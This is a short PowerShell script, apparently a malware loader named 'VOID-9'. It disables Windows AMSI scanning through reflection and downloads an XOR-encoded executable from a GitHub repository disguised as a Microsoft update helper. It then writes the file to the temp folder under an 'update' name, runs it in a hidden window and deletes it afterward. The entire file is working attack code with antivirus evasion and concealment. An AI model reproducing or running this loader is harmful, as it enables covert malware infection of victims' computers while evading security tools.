# VOID-9 SIMPLEST WORKING LOADER
$ErrorActionPreference = 'SilentlyContinue'

# Basic bypass
$amsi = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
$amsi.GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

try {
    $wc = New-Object Net.WebClient
    $wc.Headers.Add("User-Agent", "Mozilla/5.0")
    $data = $wc.DownloadData("https://raw.githubusercontent.com/s7xeyes/Microsoft-Update-Helper/main/winverify.exe")

    for($i = 0; $i -lt $data.Length; $i++) {
        $data[$i] = $data[$i] -bxor 0x69
    }

    $rand = Get-Random -Maximum 999999999
    $exe = "$env:TEMP\update_$rand.exe"

    [IO.File]::WriteAllBytes($exe, $data)
    Start-Process -FilePath $exe -WindowStyle Hidden

    Start-Sleep -Seconds 5
    Remove-Item $exe -Force -ErrorAction SilentlyContinue
}
catch {}
